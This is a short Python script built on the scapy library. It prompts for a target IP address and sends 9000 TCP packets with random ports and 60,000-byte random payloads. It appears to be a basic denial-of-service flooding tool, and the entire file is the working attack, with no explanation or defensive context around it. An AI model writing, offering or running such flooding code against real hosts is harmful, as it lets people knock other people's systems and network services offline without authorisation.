import sys
from scapy.all import *

targetIP = raw_input("Target IP Address: ")
#targetPort = raw_input("Target Port: ")

send(IP(dst=targetIP)/TCP(sport=RandShort(),dport=RandShort())/Raw(RandString(size=60000)), count=9000)
